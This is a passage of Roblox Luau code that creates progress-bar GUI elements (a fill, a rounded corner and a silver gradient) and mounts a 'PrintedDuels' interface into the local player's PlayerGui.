G.ProgressFill.Size = UDim2.new(0, 0, 1, 0)
G.ProgressFill.ZIndex = 5
G.ProgressFill.Parent = G.ProgressTrack

-- UICorner_212 (UICorner)
G.UICorner_212 = Instance.new("UICorner")
G.UICorner_212.CornerRadius = UDim.new(1, 0)
G.UICorner_212.Parent = G.ProgressFill

-- UIGradient_7 (UIGradient)
G.UIGradient_7 = Instance.new("UIGradient")
G.UIGradient_7.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(210, 214, 224)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(250, 251, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(215, 220, 230))})
G.UIGradient_7.Parent = G.ProgressFill

-- mount
G.PrintedDuels.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

return G.PrintedDuels